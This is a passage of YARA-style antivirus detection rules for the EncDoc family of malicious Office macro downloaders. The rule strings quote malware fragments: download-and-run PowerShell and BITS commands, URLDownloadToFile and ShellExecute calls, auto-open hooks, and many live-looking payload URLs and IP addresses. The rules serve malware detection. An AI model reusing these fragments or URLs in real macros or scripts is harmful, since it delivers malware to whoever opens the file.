        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "htt`p://52.58.97.51/T67/F2/BRL_2451020032016.e`xe\" & \" -Destination C:\\Users\\Public\\Documents\\opportunitywriter.e`xe" ascii //weight: 1
        $x_1_2 = "htt`ps://cdn.discordapp.com/attachments/879094696843038753/884871680210640896/Auto-News.e`xe" ascii //weight: 1
        $x_1_3 = "htt`p://185.157.160.147:4444/BTconsole3.e`xe\" & \" -Destination C:\\Users\\Public\\Documents\\Congressparticular.e`xe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_17
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 22 68 5e 65 6c 6c 22 [0-32] 20 3d 20 46 72 65 65 46 69 6c 65 [0-3] 4f 70 65 6e 20 [0-21] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23}  //weight: 1, accuracy: Low
        $x_1_2 = "sheee = \"shel" ascii //weight: 1
        $x_1_3 = {26 20 22 20 2d 44 65 73 74 69 6e 61 74 69 6f 6e 20 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-32] 2e 65 60 78 65 22 20 26 20 22 3b 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c 00 2e 65 60 78 65 22 [0-3] 43 6c 6f 73 65}  //weight: 1, accuracy: Low
        $x_1_4 = {6f 62 68 20 3d 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 73 68 65 65 65 20 26 20 22 6c 2e 61 70 70 6c 69 63 61 74 69 6f 6e 22 29 2e 4f 70 65 6e 28 [0-15] 29 [0-3] 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_2_5 = {26 20 22 20 2d 77 20 68 69 20 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 (70|70 73) 3a 2f 2f [0-48] 2e 65 60 78 65 22 20}  //weight: 2, accuracy: Low
        $x_2_6 = {3d 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-32] 2e 63 6d 22 20 26 20 43 68 72 28 31 30 30 29}  //weight: 2, accuracy: Low
        $x_2_7 = {26 20 22 20 2d 77 20 68 69 20 73 6c 65 5e 65 5e 70 20 2d 53 65 20 33 31 3b 53 74 61 72 74 2d 42 69 74 73 54 72 61 6e 73 66 65 72 20 2d 53 6f 75 72 63 65 20 68 74 74 60 (70|70 73) 3a 2f 2f [0-108] 2e 65 60 78 65 22}  //weight: 2, accuracy: Low
        $x_2_8 = {20 3d 20 22 43 3a 5c 55 73 65 72 73 5c 50 75 62 6c 69 63 5c 44 6f 63 75 6d 65 6e 74 73 5c [0-32] 2e 63 22 20 26 20 43 68 72 28 31 30 39 29 20 26 20 22 64 22}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((1 of ($x_2_*) and 4 of ($x_1_*))) or
            ((2 of ($x_2_*) and 2 of ($x_1_*))) or
            ((3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_EncDoc_SS_2147753177_18
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SS!MTB"
        threat_id = "2147753177"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "h\"&\"t\"&\"t\"&\"ps://elitekhatsacco.co.ke/s6OkhAya/day.h\"&\"tml" ascii //weight: 1
        $x_1_2 = "h\"&\"t\"&\"tps://sukmabali.com/rwZiioLFaG/day.h\"&\"tml" ascii //weight: 1
        $x_1_3 = "h\"&\"t\"&\"tps://lfzombiegames.com/P8BJd4OW/day.h\"&\"t\"&\"ml" ascii //weight: 1
        $x_1_4 = "h\"&\"t\"&\"t\"&\"ps://safalerp.com/J1wlINw7HtJ/siera.x\"&\"ml" ascii //weight: 1
        $x_1_5 = "h\"&\"t\"&\"t\"&\"ps://godschildrenaf.org/qxwbRMzrqoWK/siera.x\"&\"ml\\\"" ascii //weight: 1
        $x_1_6 = "h\"&\"t\"&\"t\"&\"ps://callgirlsandescortkenya.site/hllzvTuU/siera.x\"&\"m\"&\"l" ascii //weight: 1
        $x_1_7 = "htt\"&\"ps:/\"&\"/slterp.c\"&\"om/q6tM5LqSc7CV/alp.html" ascii //weight: 1
        $x_1_8 = "htt\"&\"ps:/\"&\"/greenhillsacademy.o\"&\"rg/d1XXblsaG/alp.html" ascii //weight: 1
        $x_1_9 = "htt\"&\"ps:/\"&\"/uptownsparksenergy.c\"&\"om/Vcvci5hRYpb/alp.html" ascii //weight: 1
        $x_1_10 = "h\"&\"t\"&\"t\"&\"ps://la\"&\"resumeservice.com/cymxrDQLGo9i/estimate.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_11 = "h\"&\"t\"&\"t\"&\"ps://m\"&\"edicahealthy.net/HZHWZYIq/e\"&\"stimat.h\"&\"t\"&\"ml" ascii //weight: 1
        $x_1_12 = "h\"&\"t\"&\"t\"&\"p://p\"&\"inakidigital.com/vNlUFyxQUW/e\"&\"stima.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_13 = "h\"&\"t\"&\"t\"&\"ps://ki\"&\"ki\"&\"n\"&\"ibo.com/Prxpa1zsH/sureto.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_14 = "h\"&\"t\"&\"t\"&\"ps://saa\"&\"nv\"&\"ikaindia.com/bTUyY2Nv/suret.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_15 = "h\"&\"t\"&\"t\"&\"ps://in\"&\"viyoga.vn/6WHg6YCNk9/sure.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_16 = "h\"&\"t\"&\"t\"&\"ps://oh\"&\"emaa.org/HU\"&\"Vm9mDKLW9C/ocrafhh.h\"&\"t\"&\"ml\"" ascii //weight: 1
        $x_1_17 = "h\"&\"tt\"&\"ps://madi\"&\"ea\"&\"ndme.com.au/xnkpOLnvlN6T/o\"&\"crafh.h\"&\"t\"&\"ml\"" ascii //weight: 1
        $x_1_18 = "h\"&\"tt\"&\"ps://am\"&\"er\"&\"ident.com.do/xd\"&\"OMlaB0XJ7/ocraf.h\"&\"t\"&\"m\"&\"l\",\"" ascii //weight: 1
        $x_1_19 = "h\"&\"t\"&\"tp\"&\"s://bost\"&\"onav\"&\"enue.org/zunSJE0UYwbJ/su\"&\"nise.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_20 = "h\"&\"ttp\"&\"s://pmq\"&\"der\"&\"matology.com.au/0aafNmAW9/su\"&\"raise.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_21 = "h\"&\"tt\"&\"ps://fu\"&\"nzy.id/0KI\"&\"CC3zxK2nT/su\"&\"nraie.h\"&\"t\"&\"m\"&\"l\"" ascii //weight: 1
        $x_1_22 = "h\"&\"t\"&\"t\"&\"ps://el\"&\"cb\"&\"d.net/QJ\"&\"89\"&\"y2\"&\"Nztyh/alena.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_23 = "h\"&\"t\"&\"t\"&\"ps://p\"&\"mbt\"&\"von\"&\"line.com/HHQx\"&\"jY8\"&\"UnnDR/ale.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_24 = "h\"&\"t\"&\"t\"&\"ps://saft\"&\"ro\"&\"nics.co.za/WRpRfTpvJ/alen.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_25 = "h\"&\"tt\"&\"ps://gre\"&\"enb\"&\"iofa\"&\"rm.org/KyVAfo3JKEs/hnhkji.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_26 = "h\"&\"t\"&\"tps://nee\"&\"m\"&\"tv.in/XOTtDoBEZU4/hnhkji.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_27 = "h\"&\"t\"&\"tps://soft.trans\"&\"fote\"&\"ch.com.pk/qrXUmwF3xFqY/hnhkji.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_28 = "h\"&\"tt\"&\"ps://pv\"&\"plgl\"&\"ob\"&\"al.com/G\"&\"3Sc\"&\"73W\"&\"pc\"&\"So5/211021.g\"&\"i\"&\"f" ascii //weight: 1
        $x_1_29 = "h\"&\"ttp\"&\"s://ivyf\"&\"as\"&\"h\"&\"ion.in/9EzVsR\"&\"wP\"&\"Kml/211021.g\"&\"i\"&\"f" ascii //weight: 1
        $x_1_30 = "h\"&\"tt\"&\"ps://m2au\"&\"topar\"&\"tsin\"&\"dia.com/Ho\"&\"2Ej\"&\"Thh\"&\"Amw/211021.g\"&\"i\"&\"f" ascii //weight: 1
        $x_1_31 = "h\"&\"t\"&\"t\"&\"p\"&\"s://v\"&\"al\"&\"mi\"&\"ra\"&\"dv\"&\"og\"&\"ad\"&\"os.a\"&\"d\"&\"v.br/D\"&\"Dx\"&\"Pa\"&\"uo\"&\"o2m/fo.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_32 = "h\"&\"tt\"&\"ps://m\"&\"i\"&\"s.learning.mn/JGMwSP4PnKp/fk.html" ascii //weight: 1
        $x_1_33 = "h\"&\"tt\"&\"ps://n\"&\"a\"&\"mec\"&\"ar\"&\"d.es\"&\"er\"&\"vice.mn/MF\"&\"Yz\"&\"MpeC\"&\"LYb/ok.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_34 = "h\"&\"t\"&\"tp\"&\"s://s\"&\"c\"&\"o.c\"&\"o\"&\"m.br/d\"&\"PB\"&\"0iP\"&\"it6f8/b.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_35 = "h\"&\"t\"&\"t\"&\"p\"&\"s://brunodinizitatiaia.com.br/eHOVauZU/b.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_36 = "h\"&\"ttp\"&\"s://s\"&\"oc\"&\"cer-a\"&\"ss\"&\"ist.co.uk/57IsaduJ/b.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_37 = "h\"&\"t\"&\"t\"&\"p\"&\"s://om\"&\"oay\"&\"e.com.br/Z0U7Ivtd04b/r.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_38 = "h\"&\"t\"&\"t\"&\"p\"&\"s://ag\"&\"ory\"&\"um.com/lPLd50ViH4X9/r.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_39 = "h\"&\"t\"&\"t\"&\"p\"&\"s://mcd\"&\"ream\"&\"co\"&\"ncept.ng/9jFVONntA9x/r.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_40 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":/\"&\"/\"&\"i\"&\"m\"&\"p\"&\"e\"&\"r\"&\"i\"&\"a\"&\"l\"&\"m\"&\"m\"&\".c\"&\"o\"&\"m\"&\"/4\"&\"2\"&\"3\"&\"Q\"&\"u\"&\"v\"&\"p\"&\"C/f\"&\"e.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_41 = "h\"&\"t\"&\"t\"&\"p\"&\"s\"&\":/\"&\"/n\"&\"i\"&\"m\"&\"ix\"&\"t\"&\"u\"&\"t\"&\"o\"&\"r\"&\"i\"&\"a\"&\"l\"&\"s\"&\".i\"&\"r/S\"&\"p\"&\"i\"&\"1\"&\"m\"&\"d\"&\"d\"&\"p\"&\"6\"&\"i\"&\"W\"&\"2\"&\"/f\"&\"e.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
        $x_1_42 = "h\"&\"t\"&\"t\"&\"p\"&\"s:/\"&\"/t\"&\"e\"&\"c\"&\"h\"&\"n\"&\"o\"&\"z\"&\"o\"&\"n\"&\"e\"&\".a\"&\"z/Z\"&\"4f\"&\"M\"&\"F\"&\"8\"&\"i\"&\"7\"&\"2\"&\"l\"&\"7\"&\"E/f\"&\"e.h\"&\"t\"&\"m\"&\"l" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_I_2147753256_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.I!MTB"
        threat_id = "2147753256"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 74 74 70 3a 2f 2f 6d 61 72 63 68 32 36 32 30 32 30 2e 63 6c 75 62 2f 66 69 6c 65 73 2f [0-16] 2e 64 6c 6c}  //weight: 1, accuracy: Low
        $x_1_2 = "C:\\XTHbSJX\\hQPDpQm\\yNuMyDc.dl" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_Q_2147753447_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.Q!MTB"
        threat_id = "2147753447"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "https://faog.org.hk/scanner/overwatch.php" ascii //weight: 1
        $x_1_2 = {68 74 74 70 3a 2f 2f 73 65 72 76 69 63 65 2e 70 61 6e 64 74 65 6c 65 63 74 72 69 63 2e 63 6f 6d 2f [0-16] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_3 = {50 72 6f 67 72 61 6d 44 61 74 61 5c [0-16] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_4 = "URLMON" ascii //weight: 1
        $x_1_5 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_6 = "Shell32" ascii //weight: 1
        $x_1_7 = "ShellExec" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AR_2147753488_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AR!MTB"
        threat_id = "2147753488"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "20"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "dHA6Ly8xOTIuMjM2LjE3OC44MC83ei8wNjE3NzczLmpw" ascii //weight: 10
        $x_10_2 = "c1xQdWJsaWNcd2hwZndrcnVsLmV4ZSJ9Ig==" ascii //weight: 10
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AR_2147753488_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AR!MTB"
        threat_id = "2147753488"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "33"
        strings_accuracy = "Low"
    strings:
        $x_10_1 = {68 74 74 70 3a 2f 2f [0-40] 2f 0f 00 2f 44}  //weight: 10, accuracy: Low
        $x_10_2 = {68 74 74 70 3a 2f 2f [0-40] 2f 0f 00 2f 0f 00 2e 70 6e 67}  //weight: 10, accuracy: Low
        $x_10_3 = {09 00 00 43 3a 5c [0-15] 5c}  //weight: 10, accuracy: Low
        $x_1_4 = "zipfldr" ascii //weight: 1
        $x_1_5 = "JJCCCJ" ascii //weight: 1
        $x_1_6 = "dToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_AR_2147753488_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.AR!MTB"
        threat_id = "2147753488"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "22"
        strings_accuracy = "High"
    strings:
        $x_10_1 = "http://jmdmenswear.com/dvxqi/D" ascii //weight: 10
        $x_10_2 = "http://jmdmenswear.com/dvxqi/530340.png" ascii //weight: 10
        $x_1_3 = "C:\\Datop\\" ascii //weight: 1
        $x_1_4 = "zipfldr" ascii //weight: 1
        $x_1_5 = "JJCCCJ" ascii //weight: 1
        $x_1_6 = "dToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_10_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_EncDoc_SE_2147753670_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SE!MTB"
        threat_id = "2147753670"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "instr(1,base64chars,mid$(base64string,i+2,1))-1bytes(i+2)=instr(1,base64chars,mid$(base64string,i+3,1))" ascii //weight: 1
        $x_1_2 = "subautoopen()" ascii //weight: 1
        $x_1_3 = "=createobject(\"wscript.shell\")var21=var31.specialfolders(\"appdata\")var21=var21+\"\\hihi.ps1" ascii //weight: 1
        $x_1_4 = "winhttpreq.open\"get\",link,falsewinhttpreq.sendfilecontent" ascii //weight: 1
        $x_1_5 = "=1ostream.writefilecontentostream.savetofilevar21" ascii //weight: 1
        $x_1_6 = "https://gist.githubusercontent.com/hoanga2dtk68/3fe20a1a21df992fa462142b17f3cee0/raw/af052a13970ad1557f0e1225e82f4aa6619c047f/hihi.ps1" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_PI_2147753680_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.PI!MSR"
        threat_id = "2147753680"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "createobject(\"windowsinstaller.installer\")" ascii //weight: 1
        $x_1_2 = ".installproduct\"http://45.147.229.91" ascii //weight: 1
        $x_1_3 = "subauto_open()" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_SA_2147753727_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.SA!MTB"
        threat_id = "2147753727"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Sub Workbook_Open()" ascii //weight: 1
        $x_1_2 = "= Range(\"A1:A13\")" ascii //weight: 1
        $x_1_3 = "= myRange.Count" ascii //weight: 1
        $x_1_4 = "= \"C:\\Users\\Public\\textfile.wsf\"" ascii //weight: 1
        $x_1_5 = "= \"wscript \" + myFile" ascii //weight: 1
        $x_1_6 = "Shell k, vbNormalFocus" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_M_2147753752_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.M!MTB"
        threat_id = "2147753752"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "C:\\ProgramData\\MIwRHxM.exe" ascii //weight: 1
        $x_1_2 = "C:\\ProgramData\\kgUpfWk.exe" ascii //weight: 1
        $x_1_3 = "C:\\ProgramData\\VjRiUYy.exe" ascii //weight: 1
        $x_1_4 = "C:\\ProgramData\\sodxofs.dll" ascii //weight: 1
        $x_1_5 = "C:\\ProgramData\\todxofs.dll" ascii //weight: 1
        $x_1_6 = "C:\\ProgramData\\BysKIez.dll" ascii //weight: 1
        $x_1_7 = "C:\\ProgramData\\lrnyDRm.dll" ascii //weight: 1
        $x_1_8 = "C:\\ProgramData\\bpXoaeE.dll" ascii //weight: 1
        $x_1_9 = "C:\\ProgramData\\OwwjWxU.dll" ascii //weight: 1
        $x_1_10 = "C:\\ProgramData\\ziiWIjG.dll" ascii //weight: 1
        $x_1_11 = "C:\\ProgramData\\goBdwcB.dll" ascii //weight: 1
        $x_1_12 = "C:\\lUUHtVr\\ESzRDHg\\bXMgWNb.dll" ascii //weight: 1
        $x_1_13 = "C:\\wCngnRe\\dtxBrRg\\HZUKpxy.dll" ascii //weight: 1
        $x_1_14 = "C:\\zKfsfSt\\QOqYpbf\\QzhkFhl.dll" ascii //weight: 1
        $x_1_15 = "C:\\veeREfC\\OcKbNRr\\lhWqhXl.dll" ascii //weight: 1
        $x_1_16 = "C:\\gmitwMh\\isCwaqJ\\IGzSPlI.dll" ascii //weight: 1
        $x_1_17 = "C:\\RbwKxjL\\hgIpHsw\\hSzCWyE.dll" ascii //weight: 1
        $x_1_18 = "C:\\hQQDpQm\\zOuMyDc\\XTHcSJX.exe" ascii //weight: 1
        $x_1_19 = "C:\\pYYLxYu\\IWDVHLk\\fbPkaRf.exe" ascii //weight: 1
        $x_1_20 = "URLMON" ascii //weight: 1
        $x_1_21 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_22 = "Shell32" ascii //weight: 1
        $x_1_23 = "ShellExecuteA" ascii //weight: 1
        $x_1_24 = "rundll32.exe" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (6 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_R_2147754108_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.R!MTB"
        threat_id = "2147754108"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= \"t\" + \"t\" + \"p\" + \":\" + \"/\" + \"/\" +" ascii //weight: 1
        $x_1_2 = "= \"m\" + \"s\" + \"h\" + \"t\" + \"a" ascii //weight: 1
        $x_1_3 = "= \".j.mp/" ascii //weight: 1
        $x_3_4 = {6a 2e 6d 70 2f 61 6a 64 64 64 73 64 73 64 6a 73 6a 63 6a 6f 73 64 6a 3f 00 68 74 74 70 3a 2f 2f 77 77 77 2e}  //weight: 3, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_1_*))) or
            ((1 of ($x_3_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_EncDoc_R_2147754108_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.R!MTB"
        threat_id = "2147754108"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "11"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = "rockstar.php" ascii //weight: 3
        $x_3_2 = "https://spdtextile.com/sport/" ascii //weight: 3
        $x_3_3 = "https://spdtextile.com/sport/rockstar.php" ascii //weight: 3
        $x_1_4 = {43 3a 5c 50 72 6f 67 72 61 6d 44 61 74 61 5c ?? ?? ?? ?? ?? ?? ?? 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_5 = "URLDownloadToFileA" ascii //weight: 1
        $x_1_6 = "ShellExecuteA" ascii //weight: 1
        $x_1_7 = "CreateDirectoryA" ascii //weight: 1
        $x_1_8 = "URLMON" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (
            ((2 of ($x_3_*) and 5 of ($x_1_*))) or
            ((3 of ($x_3_*) and 2 of ($x_1_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_EncDoc_R_2147754108_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.R!MTB"
        threat_id = "2147754108"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "1"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {46 75 6e 63 74 69 6f 6e 20 52 75 6e 41 6e 64 47 65 74 43 6d 64 28 29 0d 0a [0-15] 3d 20 53 68 65 6c 6c 28 22 63 6d 64 2e 65 78 65 20 2f 63 20 22 22 70 6f 77 65 72 73 68 65 6c 6c 2e 65 78 65 20 49 45 58 20 28 4e 65 77 2d 4f 62 6a 65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 6e 6c 6f 61 64 53 74 72 69 6e 67 28 27 68 74 74 70 73 3a 2f 2f 70 61 73 74 65 62 69 6e 2e 63 6f 6d 2f 72 61 77 2f 70 47 59 30 66 77 37 33 27 29 22 22 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {34 35 2e 31 34 2e 32 32 36 2e 32 32 31 2f 63 64 66 65 2f 46 61 63 6b 2e 6a 70 67 27 29 22 7f 00 20 2d 6e 6f 65 78 69 74 20 20 20 2d 63 6f 6d 6d 61 20 49 6e 76 6f 6b 65 2d 45 78 70 72 65 73 73 69 6f 6e 28 4e 65 77 2d 4f 62 6a 65 63 74 20 4e 65 74 2e 57 65 62 43 6c 69 65 6e 74 29 2e 44 6f 77 4e 6c 6f 41 64 53 54 52 69 4e 67 2e 49 6e 76 6f 6b 65 28 27 68 74 74 70 3a 2f 2f}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (1 of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BK_2147754187_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BK!MTB"
        threat_id = "2147754187"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "EncDoc"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "'ht'+'tp://paste.ee/r/w0yLV" ascii //weight: 1
        $x_1_2 = "(new`-OB`jeCT('Net.WebClient'))" ascii //weight: 1
        $x_1_3 = ".'DoWnloAdsTrInG'" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_EncDoc_BK_2147754187_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/EncDoc.BK!MTB"
